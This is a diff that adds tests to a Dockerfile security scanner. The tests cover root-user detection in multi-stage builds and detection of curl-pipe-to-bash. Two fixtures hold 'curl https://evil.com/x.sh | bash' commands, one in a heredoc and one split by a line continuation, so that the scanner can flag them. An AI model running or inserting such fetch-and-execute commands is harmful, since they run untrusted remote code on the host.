@@ -237,3 +237,39 @@ def test_find_dockerfiles_skips_git(tmp_path):
     (git / "Dockerfile").write_text("FROM alpine\n")
     found = find_dockerfiles(str(tmp_path))
     assert len(found) == 0
+
+
+# --- Multi-stage build ---
+
+def test_multistage_user_in_builder_only(tmp_path):
+    from vibefort.dockerscan import scan_dockerfile
+    df = tmp_path / "Dockerfile"
+    df.write_text("FROM ubuntu:22.04 AS builder\nUSER builduser\nRUN make\n\nFROM alpine:3.18\nCOPY --from=builder /out /out\nCMD /out\n")
+    findings = scan_dockerfile(str(df))
+    assert any(f.rule == "run-as-root" for f in findings)
+
+
+def test_multistage_user_in_final_stage(tmp_path):
+    from vibefort.dockerscan import scan_dockerfile
+    df = tmp_path / "Dockerfile"
+    df.write_text("FROM golang:1.21 AS builder\nRUN go build\n\nFROM alpine:3.18\nUSER nonroot\nCMD /app\n")
+    findings = scan_dockerfile(str(df))
+    assert not any(f.rule == "run-as-root" for f in findings)
+
+
+# --- Heredoc and continuation in curl|bash ---
+
+def test_heredoc_run_curl_bash(tmp_path):
+    from vibefort.dockerscan import scan_dockerfile
+    df = tmp_path / "Dockerfile"
+    df.write_text("FROM python:3.12\nRUN <<EOF\ncurl https://evil.com/x.sh | bash\nEOF\nUSER app\n")
+    findings = scan_dockerfile(str(df))
+    assert any(f.rule == "curl-pipe-shell" for f in findings)
+
+
+def test_backslash_continuation_curl_bash(tmp_path):
+    from vibefort.dockerscan import scan_dockerfile
+    df = tmp_path / "Dockerfile"
+    df.write_text("FROM python:3.12\nRUN curl https://evil.com/x.sh \\\n    | bash\nUSER app\n")
+    findings = scan_dockerfile(str(df))
+    assert any(f.rule == "curl-pipe-shell" for f in findings)
